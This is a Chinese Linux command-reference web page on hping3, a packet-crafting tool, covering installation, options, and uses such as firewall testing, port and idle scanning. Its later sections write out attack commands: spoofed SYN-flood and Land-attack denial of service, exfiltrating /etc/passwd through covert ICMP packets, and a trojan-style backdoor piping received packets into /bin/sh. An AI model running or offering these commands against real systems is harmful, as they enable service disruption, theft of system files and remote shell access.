@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8" />
+<meta name="renderer" content="webkit">
+<title>
+hping3命令_Linux hping3 命令用法详解：测试网络及主机的安全</title>
+<link rel="shortcut icon" href="http://man.linuxde.net/favicon.ico" type="image/x-icon" />
+<link rel="pingback" href="http://man.linuxde.net/xmlrpc.php" />
+<link href="http://112.124.15.130/res/linuxde_man/style.css" rel="stylesheet" type="text/css">
+<script type="text/javascript" src="http://112.124.15.130/res/linuxde_man/js/jquery-1.8.3.min.js"></script>
+<!--[if IE 6]>
+<script src="http://112.124.15.130/res/linuxde_man/js/belatedPNG.js"></script>
+<script>DD_belatedPNG.fix('*');</script>
+<script src="http://letskillie6.googlecode.com/svn/trunk/letskillie6.zh_CN.pack.js"></script>
+<![endif]-->
+<link rel='canonical' href='http://man.linuxde.net/hping3' />
+</head>
+<body>
+<noscript>
+<p class="nojs">您的浏览器已经禁用了脚本，这会严重影响您正常使用本站的功能，请开启！</p>
+</noscript>
+<div class="man_linuxde_net_page">
+<div class="layout_hd">
+    <div class="logo l">
+        <h2><a title="Linux命令大全" href="http://man.linuxde.net/">
+            Linux命令大全            </a></h2>
+    </div>
+    <div class="nav r"><ul id="menu-%e8%8f%9c%e5%8d%951" class="menu"><li id="menu-item-4" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-4"><a href="http://man.linuxde.net/">首页搜索</a></li>
+<li id="menu-item-6" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6"><a href="http://man.linuxde.net/par/2">系统管理</a></li>
+<li id="menu-item-7" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-7"><a href="http://man.linuxde.net/par/5">网络管理</a></li>
+<li id="menu-item-8" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-8"><a href="http://man.linuxde.net/par/4">软件·打印·开发·工具</a></li>
+<li id="menu-item-9" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9"><a href="http://man.linuxde.net/par/1">文件和目录管理</a></li>
+<li id="menu-item-10" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-10"><a href="http://man.linuxde.net/par/3">硬件·内核·Shell·监测</a></li>
+<li id="menu-item-2096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2096"><a target="_blank" href="http://www.linuxde.net">Linux Today</a></li>
+</ul></div>    <div class="c"></div>
+</div>
+<div class="layout layout_bd">
+<script type='text/javascript'>
+function addLink() {
+    var body_element = document.getElementsByTagName('body')[0];
+    var selection;
+    selection = window.getSelection();
+    var pagelink = "<br /><br /> 来自: <a href='"+document.location.href+"'>"+document.location.href+"</a>"; 
+    var copy_text = selection + pagelink;
+    var new_div = document.createElement('div');
+    new_div.style.left='-99999px';
+    new_div.style.position='absolute';
+    body_element.appendChild(new_div );
+    new_div.innerHTML = copy_text ;
+    selection.selectAllChildren(new_div );
+    window.setTimeout(function() {
+        body_element.removeChild(new_div );
+    },0);
+}
+document.oncopy = addLink;
+</script>
+<div class="single_default">
+        <div class="main">
+        <div class="breadcrumb">当前位置：<a href="http://man.linuxde.net">首页</a> &raquo; <a href="http://man.linuxde.net/par/5" rel="category tag">网络管理</a> &raquo; hping3</div>
+        <div class="post_hd clearfix">
+            <h1 class="l">hping3命令</h1>
+            <div class="tag f_yh r">
+                <a href="http://man.linuxde.net/sub/%e7%bd%91%e7%bb%9c%e6%b5%8b%e8%af%95" rel="tag">网络测试</a>            </div>
+        </div>
+        <div class="post_bd post">
+            <p>
+	<strong>hping</strong>是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。
+</p>
+<h3>
+	安装<br />
+</h3>
+<pre>
+<span class='wp_keywordlink'><a href="http://man.linuxde.net/yum" title="yum命令" target="_blank">yum</a></span> <span class='wp_keywordlink'><a href="http://man.linuxde.net/install" title="install命令" target="_blank">install</a></span> libpcap-devel tc-devel
+<span class='wp_keywordlink'><a href="http://man.linuxde.net/ln" title="ln命令" target="_blank">ln</a></span> -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
+<span class='wp_keywordlink'><a href="http://man.linuxde.net/wget" title="wget命令" target="_blank">wget</a></span> http://www.hping.org/hping3-20051105.<span class='wp_keywordlink'><a href="http://man.linuxde.net/tar" title="tar命令" target="_blank">tar</a></span>.gz
+tar zxvf hping3-20051105.tar.gz
+<span class='wp_keywordlink'><a href="http://man.linuxde.net/cd" title="cd命令" target="_blank">cd</a></span> hping3-20051105
+./configure
+<span class='wp_keywordlink'><a href="http://man.linuxde.net/make" title="make命令" target="_blank">make</a></span>
+make install</pre>
+<h3>
+	选项<br />
+</h3>
+<pre>
+-H --<span class='wp_keywordlink'><a href="http://man.linuxde.net/help" title="help命令" target="_blank">help</a></span> 显示帮助。
+-v -VERSION 版本信息。
+-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
+-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
+-n -nmeric 数字输出，象征性输出主机地址。
+-q -quiet 退出。
+-I --interface interface name 无非就是eth0之类的参数。
+-v --verbose 显示很多信息，TCP回应一般如：len=46 <span class='wp_keywordlink'><a href="http://man.linuxde.net/ip" title="ip命令" target="_blank">ip</a></span>=192.168.1.1 flags=RADF <span class='wp_keywordlink'><a href="http://man.linuxde.net/seq" title="seq命令" target="_blank">seq</a></span>=0 ttl=255 <span class='wp_keywordlink'><a href="http://man.linuxde.net/id" title="id命令" target="_blank">id</a></span>=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 <span class='wp_keywordlink'><a href="http://man.linuxde.net/sum" title="sum命令" target="_blank">sum</a></span>=2010 urp=0
+-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）
+-z --<span class='wp_keywordlink'><a href="http://man.linuxde.net/bind" title="bind命令" target="_blank">bind</a></span> 快捷键的使用。
+-Z --unbind 消除快捷键。
+-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。
+-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
+-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
+-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
+-a --spoof <span class='wp_keywordlink'><a href="http://man.linuxde.net/hostname" title="hostname命令" target="_blank">hostname</a></span> 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
+-t --ttl <span class='wp_keywordlink'><a href="http://man.linuxde.net/time" title="time命令" target="_blank">time</a></span> to live 可以指定发出包的TTL值。
+-H --ipproto 在RAW IP模式里选择IP协议。
+-<span class='wp_keywordlink'><a href="http://man.linuxde.net/w" title="w命令" target="_blank">w</a></span> --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
+-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
+-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的&ldquo;virtual mtu&rdquo;是16字节。
+-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
+-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
+-G --fragoff fragment offset value <span class='wp_keywordlink'><a href="http://man.linuxde.net/set" title="set命令" target="_blank">set</a></span> the fragment offset
+-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
+-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
+-C --ICMPTYPE <span class='wp_keywordlink'><a href="http://man.linuxde.net/type" title="type命令" target="_blank">type</a></span> 指定ICMP类型，缺省是ICMP <span class='wp_keywordlink'><a href="http://man.linuxde.net/echo" title="echo命令" target="_blank">echo</a></span> REQUEST。
+-K --ICMPCODE CODE 指定ICMP代号，缺省0。
+--icmp-ipver 把IP版本也插入IP头。
+--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
+--icmp-iplen 设置IP包长度。
+--icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。
+--icmp-ipproto 设置协议的，缺省是TCP。
+-icmp-<span class='wp_keywordlink'><a href="http://man.linuxde.net/cksum" title="cksum命令" target="_blank">cksum</a></span> 设置校验和。
+-icmp-ts <span class='wp_keywordlink'><a href="http://man.linuxde.net/alias" title="alias命令" target="_blank">alias</a></span> for --icmptype 13 (to send ICMP timestamp requests)
+--icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)
+-s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
+-p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
+--keep 上面说过了。
+-w --win 发的大小和windows一样大，64BYTE。
+-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.
+-m --tcpseq 设置TCP序列数。
+-l --tcpck 设置TCP ack。
+-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。</pre>
+<h3>
+	Hping3功能<br />
+</h3>
+<p>
+	Hping3主要有以下典型功能应用：
+</p>
+<h4>
+	&nbsp;防火墙测试<br />
+</h4>
+<p>
+	使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank">http://0daysecurity.com/articles/hping3_examples.html</a>
+</p>
+<p>
+	测试防火墙对ICMP包的反应、是否支持<span class='wp_keywordlink'><a href="http://man.linuxde.net/traceroute" title="traceroute命令" target="_blank">traceroute</a></span>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。
+</p>
+<pre>
+hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</pre>
+<h4>
+	端口扫描<br />
+</h4>
+<p>
+	Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：
+</p>
+<pre>
+hping3 -I eth0  -S 192.168.10.1 -p 80</pre>
+<p>
+	其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。
+</p>
+<p>
+	hping3支持非常丰富的端口探测方式，<span class='wp_keywordlink'><a href="http://man.linuxde.net/nmap" title="nmap命令" target="_blank">nmap</a></span>拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。
+</p>
+<h4>
+	Idle扫描<br />
+</h4>
+<p>
+	Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。
+</p>
+<p>
+	该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。
+</p>
+<h4>
+	拒绝服务攻击<br />
+</h4>
+<p>
+	使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
+</p>
+<pre>
+hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</pre>
+<p>
+	其他攻击如smurf、teardrop、land attack等也很容易构建出来。
+</p>
+<h4>
+	文件传输<br />
+</h4>
+<p>
+	Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：
+</p>
+<pre>
+hping3 192.168.1.159--listen signature --safe  --icmp</pre>
+<p>
+	监听ICMP包中的签名，根据签名解析出文件内容。
+</p>
+<p>
+	在发送端使用签名打包的ICMP包发送文件：
+</p>
+<pre>
+hping3 192.168.1.108--icmp ?d 100 --sign signature --<span class='wp_keywordlink'><a href="http://man.linuxde.net/file" title="file命令" target="_blank">file</a></span> /etc/<span class='wp_keywordlink'><a href="http://man.linuxde.net/passwd" title="passwd命令" target="_blank">passwd</a></span></pre>
+<p>
+	将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。
+</p>
+<h4>
+	木马功能<br />
+</h4>
+<p>
+	如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<span class='wp_keywordlink'><a href="http://man.linuxde.net/nc_netcat" title="netcat命令" target="_blank">netcat</a></span>的后门功能类似。
+</p>
+<p>
+	示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。
+</p>
+<p>
+	在木马启动端：
+</p>
+<pre>
+hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh</pre>
+<p>
+	在远程控制端：
+</p>
+<pre>
+echo <span class='wp_keywordlink'><a href="http://man.linuxde.net/ls" title="ls命令" target="_blank">ls</a></span> &gt;<span class='wp_keywordlink'><a href="http://man.linuxde.net/test" title="test命令" target="_blank">test</a></span>.cmd
+hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</pre>
+<p>
+	将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。
+</p>
+<p>
+	当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
+        </div>
+        <div class="post_ft">
+            <div class="title">最近更新的命令</div>
+            <ul>
+                <li><a href="http://man.linuxde.net/cut" title="cut">cut</a></li><li><a href="http://man.linuxde.net/sh" title="sh">sh</a></li><li><a href="http://man.linuxde.net/seq" title="seq">seq</a></li><li><a href="http://man.linuxde.net/awk" title="awk">awk</a></li><li><a href="http://man.linuxde.net/syslog" title="syslog">syslog</a></li><li><a href="http://man.linuxde.net/inotifywait" title="inotifywait">inotifywait</a></li><li><a href="http://man.linuxde.net/dd" title="dd">dd</a></li><li><a href="http://man.linuxde.net/read" title="read">read</a></li><li><a href="http://man.linuxde.net/uname" title="uname">uname</a></li><li><a href="http://man.linuxde.net/pssh" title="pssh">pssh</a></li><li><a href="http://man.linuxde.net/tar" title="tar">tar</a></li><li><a href="http://man.linuxde.net/axel" title="axel">axel</a></li><li><a href="http://man.linuxde.net/losetup" title="losetup">losetup</a></li><li><a href="http://man.linuxde.net/lsb_release" title="lsb_release">lsb_release</a></li><li><a href="http://man.linuxde.net/tcpreplay" title="tcpreplay">tcpreplay</a></li><li><a href="http://man.linuxde.net/strings" title="strings">strings</a></li><li><a href="http://man.linuxde.net/screen" title="screen">screen</a></li><li><a href="http://man.linuxde.net/speedtest-cli" title="speedtest-cli">speedtest-cli</a></li><li><a href="http://man.linuxde.net/clockdiff" title="clockdiff">clockdiff</a></li><li><a href="http://man.linuxde.net/ntpdate" title="ntpdate">ntpdate</a></li><li><a href="http://man.linuxde.net/dnf" title="dnf">dnf</a></li><li><a href="http://man.linuxde.net/nethogs" title="nethogs">nethogs</a></li><li><a href="http://man.linuxde.net/hping3" title="hping3">hping3</a></li><li><a href="http://man.linuxde.net/trap" title="trap">trap</a></li><li><a href="http://man.linuxde.net/let" title="let">let</a></li><li><a href="http://man.linuxde.net/ifstat" title="ifstat">ifstat</a></li><li><a href="http://man.linuxde.net/blkid" title="blkid">blkid</a></li><li><a href="http://man.linuxde.net/ipcrm" title="ipcrm">ipcrm</a></li><li><a href="http://man.linuxde.net/openssl" title="openssl">openssl</a></li><li><a href="http://man.linuxde.net/chage" title="chage">chage</a></li>            </ul>
+        </div>
+        <div id="comments">
+            <!-- You can start editing here. -->
+        </div>
+    </div>
+    
+<div class="sidebar">
+    <div class="widget related">
+        <div class="hd">
+            <h3>相关命令</h3>
+        </div>
+        <div class="bd">
+            <ul>
+                            <li><a href="http://man.linuxde.net/host" title="host">host</a></li>
+                <li><a href="http://man.linuxde.net/arp" title="arp">arp</a></li>
+                <li><a href="http://man.linuxde.net/nslookup" title="nslookup">nslookup</a></li>
+                <li><a href="http://man.linuxde.net/dig" title="dig">dig</a></li>
+                <li><a href="http://man.linuxde.net/netstat" title="netstat">netstat</a></li>
+                <li><a href="http://man.linuxde.net/traceroute" title="traceroute">traceroute</a></li>
+                <li><a href="http://man.linuxde.net/arping" title="arping">arping</a></li>
+                <li><a href="http://man.linuxde.net/arpwatch" title="arpwatch">arpwatch</a></li>
+                <li><a href="http://man.linuxde.net/iperf" title="iperf">iperf</a></li>
+                <li><a href="http://man.linuxde.net/nc_netcat" title="nc/netcat">nc/netcat</a></li>
+                <li><a href="http://man.linuxde.net/tracepath" title="tracepath">tracepath</a></li>
+                <li><a href="http://man.linuxde.net/ping" title="ping">ping</a></li>
+                </ul>
+        </div>
+    </div>
+    <div id="fixedBox">
+        <div id="float" class="dbox">
+            <div class="sidebar_search_box">
+                <form action="http://man.linuxde.net/">
+                    <input type="text" name="s" id="sidebar_search" value="命令搜索" onFocus="if (value =='命令搜索'){value =''}" onBlur="if (value ==''){value='命令搜索'}" />
+                </form>
+                <form action="http://man.linuxde.net/" method="post">
+                    <input type="text" name="ss" id="sidebar_search" value="命令直达" onFocus="if (value =='命令直达'){value =''}" onBlur="if (value ==''){value='命令直达'}" />
+                </form>
+            </div>
+            <div class="widget ad"> 
+				<!--
+				<script type="text/javascript">
+					document.write('<a style="display:none!important" id="tanx-a-mm_22964816_6616438_33736229"></a>');
+					tanx_s = document.createElement("script");
+					tanx_s.type = "text/javascript";
+					tanx_s.charset = "gbk";
+					tanx_s.id = "tanx-s-mm_22964816_6616438_33736229";
+					tanx_s.async = true;
+					tanx_s.src = "http://p.tanx.com/ex?i=mm_22964816_6616438_33736229";
+					tanx_h = document.getElementsByTagName("head")[0];
+					if(tanx_h)tanx_h.insertBefore(tanx_s,tanx_h.firstChild);
+				</script>
+				-->
+				<a title="linux马克杯" href="http://man.linuxde.net/go.php?http://s.click.taobao.com/t?e=m%3D2%26s%3DbWlkMAz37zAcQipKwQzePDAVflQIoZepLKpWJ%2Bin0XJRAdhuF14FMdl7wKby%2Bc%2FExq3IhSJN6GSAAkUL03DNGUpamuccnq1qrmvEga4qAXJgE5NxN1hjMoxodiO%2Bbyu%2BIYULNg46oBA%3D" target="_blank"><img src="http://112.124.15.130/res/linuxde_man/images/s-ad.jpg" alt="linux马克杯"></a>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+</div>
+
+<div class="layout layout_ft">
+    <div class="footer">
+        <div class="copyright">
+            <a href="http://man.linuxde.net/" title="Linux命令大全">Linux命令大全</a>
+            <em class="sx"></em>
+            <a href="http://man.linuxde.net/about_us" title="关于">关于</a>
+            <em class="sx"></em>
+			收藏本站请使用Ctrl+D
+			<em class="sx"></em>
+			<a href="http://man.linuxde.net/shell-script" target="_blank">Shell脚本攻略</a>
+			<em class="sx"></em>
+			<a href="http://man.linuxde.net/docs/shell_regex.html" target="_blank">Shell正则表达式</a>
+			<em class="sx"></em>
+			共收录528条Linux系统指令
+        </div>
+        <div class="des">在Linux命令大全（man.linuxde.net）可以查询您所需要的Linux命令教程和相关实例。如果您觉得本站内容对您有所帮助，请推荐给更多需要帮助的人。</div>
+        <div class="info">
+		赞助商链接：<a href="http://www.1987.name/" target="_blank">组装电脑配置清单2017</a>,　运行在<a href="http://man.linuxde.net/go.php?http://s.click.taobao.com/t?e=m%3D2%26s%3DvTDIoAjlYzMcQipKwQzePCperVdZeJviEViQ0P1Vf2kguMN8XjClAhYdwmcpX19FpcfgoZBkhQKMhxXrDnK9L8ge8W1gUmbKFOH2PYQYfJNjOghCi4TzwOdn1BbglxZYxUhy8exlzcq9AmARIwX9K2Zg%2BdzdQFOwfMRvoxSVDSdLyrb2g0H2G5JcxXijM%2BwneEHpPTskRHknGN7svee8j7S4un6ZpbmpIYULNg46oBA%3D" target="_blank">阿里云服务器</a>！
+		</div>
+    </div>
+</div>
+</div>
+<!--js-->
+<script type="text/javascript" src="http://112.124.15.130/res/linuxde_man/js/sitejs.js"></script>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"slide":{"type":"slide","bdImg":"3","bdPos":"right","bdTop":"100"}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=86835285.js?cdnversion='+~(-new Date()/36e5)];</script>
+<div style="display:none"><script src="http://s17.cnzz.com/stat.php?id=5762282&web_id=5762282" language="JavaScript"></script></div>
+
+<!--活动推广
+<script type="text/javascript" src="http://112.124.15.130/res/ad/ad.js"></script>
+<style type="text/css">
+.ad-box{width:240px;height:277px;background:#CCC;position:fixed;right:-240px;bottom:10px;}
+.ad-img{position:relative;overflow:hidden;}
+.ad-close{width:30px;height:22px;line-height:22px;display:block;top:10px;right:10px;position:absolute;}
+</style>
+<div class="ad-box">
+    <div class="ad-img">
+        <a href="http://man.linuxde.net/go.php?http://s.click.taobao.com/t?e=m%3D2%26s%3DuGXlvKu7Iv4cQipKwQzePCperVdZeJviK7Vc7tFgwiFRAdhuF14FMZQUNi%2Bb4SgsMMgx22UI05aAAkUL03DNGT6XZIOJR7dCTAHi9HSRVmdzguIHwwNmQ6UuZxIcp9pfUIgVEmFmgnbDX0%2BHH2IEVaX4VWt66S4EJPwiig1bxLP9BvYCQR6XAr%2BKQ71wHNCAqP8YyUoZZlq4cXg3ii9waXPs9Sj9Qli1np4c65at3FeX3cwyLTlAhj2l4PysJx%2FP" target="_blank"><img src="http://112.124.15.130/res/ad/1111.jpg"></a>
+        <a href="javascript:" class="ad-close">关闭</a>
+    </div>
+</div>
+<!--推广结束-->
+
+</body></html>
